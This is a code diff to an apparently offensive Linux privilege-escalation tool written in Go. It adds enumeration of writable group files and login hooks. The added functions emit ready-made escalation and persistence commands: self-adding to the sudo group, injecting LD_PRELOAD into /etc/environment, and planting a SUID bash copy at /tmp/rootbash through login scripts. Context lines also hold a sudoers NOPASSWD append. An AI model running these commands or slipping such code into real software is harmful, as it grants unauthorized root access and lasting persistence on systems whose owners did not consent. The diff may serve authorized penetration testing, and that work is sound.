@@ -17,6 +17,7 @@ var validVectors = map[string]bool{
 	"suid": true, "sgid": true, "sudo": true, "cron": true, "passwd": true, "shadow": true,
 	"docker": true, "container": true, "caps": true, "nfs": true, "path": true, "service": true,
 	"kernel": true, "cred": true, "preload": true, "sudoers": true,
+	"group": true, "hooks": true,
 }
 
 // parseVectorList splits and validates a comma-separated --vector argument.
@@ -103,6 +104,10 @@ func enumerateAll(p *AutoPrivilege) {
 			enumeratePreload(p, f)
 		case "SUDOERS":
 			enumerateSudoers(p, f)
+		case "GROUP":
+			enumerateGroup(p, f)
+		case "HOOKS":
+			enumerateHooks(p, f)
 		case "PATH":
 			enumeratePATH(p, f)
 		case "SERVICE":
@@ -188,6 +193,14 @@ func enumerateVectors(p *AutoPrivilege, names []string) {
 			case "sudoers":
 				if f.Source == "SUDOERS" {
 					enumerateSudoers(p, f)
+				}
+			case "group":
+				if f.Source == "GROUP" {
+					enumerateGroup(p, f)
+				}
+			case "hooks":
+				if f.Source == "HOOKS" {
+					enumerateHooks(p, f)
 				}
 			}
 		}
@@ -467,6 +480,41 @@ func enumerateSudoers(p *AutoPrivilege, f Finding) {
 		fmt.Sprintf("# drop-ins must be root-owned or sudo ignores them — append to an EXISTING root-owned writable file if any, then:\necho 'ALL ALL=(ALL) NOPASSWD: ALL' >> %s/<root-owned-file> && sudo -n -i", f.Target),
 		RiskHigh,
 		map[string]string{"note": "sudo rejects user-owned drop-ins; only existing root-owned writable files inside the directory are usable"})
+}
+
+// --- Group enumeration ---
+// Joining a privileged group is a config edit, not a code exec: the grant
+// lands on the NEXT login session, so no auto-exploit can honestly claim
+// root from it — manual vector with the exact append and the re-login note.
+func enumerateGroup(p *AutoPrivilege, f Finding) {
+	addManualVector(p, "group self-join", "group", f.Target,
+		fmt.Sprintf("printf 'sudo:x:27:%s\\n' >> %s   # then log out and back in\n# distros using wheel instead: replace 27 with the wheel gid (often 10)", currentUsername(), f.Target),
+		RiskHigh,
+		map[string]string{"note": "takes effect in NEW login sessions; verify the target gid with getent group sudo"})
+}
+
+// --- Login hooks enumeration ---
+// Every writable hook becomes a manual persistence/escalation vector: the
+// payload is a plain append, but it only executes when a (privileged) user
+// logs in — the tool cannot confirm root from it, so honesty keeps it
+// manual. /etc/environment gets the LD_PRELOAD technique; the shell hooks
+// get the direct SUID-shell dropper.
+func enumerateHooks(p *AutoPrivilege, f Finding) {
+	if f.Target == loginHookPaths.environment {
+		addManualVector(p, "environment preload", "hooks", f.Target,
+			"# build a shared object (needs gcc on target), then\nprintf 'LD_PRELOAD=/tmp/autopriv.so\\n' >> /etc/environment\n# any next login session — root's included — loads it at process start",
+			RiskHigh,
+			map[string]string{"note": "environment variables are process-wide: this preloads into login shells AND non-shell logins (ssh, su)"})
+		return
+	}
+	hook := f.Target
+	if info, err := os.Lstat(hook); err == nil && info.IsDir() {
+		hook = filepath.Join(hook, "autopriv.sh")
+	}
+	addManualVector(p, "login-hook "+filepath.Base(f.Target), "hooks", f.Target,
+		fmt.Sprintf("printf '#!/bin/sh\\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\\n' >> %s\n# next login shell (root's included) plants the SUID bash", hook),
+		RiskHigh,
+		map[string]string{"note": "executes on every future login shell until removed"})
 }
 
 // --- PATH enumeration (manual: payload must wait for a privileged caller) ---
